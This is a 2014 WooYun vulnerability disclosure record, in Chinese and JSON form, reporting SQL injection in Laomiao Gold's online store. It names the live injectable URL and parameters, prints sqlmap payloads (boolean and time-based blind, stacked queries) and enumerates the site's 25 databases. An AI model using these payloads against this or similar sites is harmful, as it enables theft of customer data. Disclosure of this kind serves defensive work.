{"id": 54324, "wybug_id": "wooyun-2014-064810", "wybug_title": "老庙黄金在线商城SQL注入", "wybug_corp": "上海老庙黄金有限公司", "wybug_author": "Tank", "wybug_date": "2014-06-13 21:50", "wybug_open_date": "2014-07-28 21:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-07-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 老庙黄金存在SQL注入，root权限，泄露会员资料 详细说明：  sql注入漏洞，权限较大，可脱裤   漏洞证明：  注入点：http://www.laomiao.com.cn/cn/product/index.aspx?type=ssjs&subtype=ssjs1\n\nPlace: GETParameter: type    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=ssjs' AND 1055=1055 AND 'UYyp'='UYyp&subtype=ssjs1    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: type=ssjs'; WAITFOR DELAY '0:0:5'--&subtype=ssjs1    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: type=ssjs' WAITFOR DELAY '0:0:5'--&subtype=ssjs1Place: GETParameter: subtype    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=ssjs&subtype=ssjs1' AND 8219=8219 AND 'NBhP'='NBhP---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: type    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=ssjs' AND 1055=1055 AND 'UYyp'='UYyp&subtype=ssjs1    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: type=ssjs'; WAITFOR DELAY '0:0:5'--&subtype=ssjs1    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: type=ssjs' WAITFOR DELAY '0:0:5'--&subtype=ssjs1Place: GETParameter: subtype    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=ssjs&subtype=ssjs1' AND 8219=8219 AND 'NBhP'='NBhP---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005current user is DBA:    Falseavailable databases [25]:[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] ticket[*] TicketChengHuangMiao[*] yayidata[*] yuyuancyjt[*] yuyuandzsw[*] yuyuandzswbbs[*] yuyuanfdc[*] yuyuanfirstasiajxs[*] yuyuanhbl[*] yuyuanhuijinglou[*] yuyuanhun100[*] yuyuanjck[*] yuyuanlmhj[*] yuyuanlmsp[*] yuyuantm[*] yuyuanwy[*] yuyuanxsp[*] yuyuanyayi[*] yuyuanyayi2012   修复方案：  过滤危险字符   版权声明：转载请注明来源 Tank@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}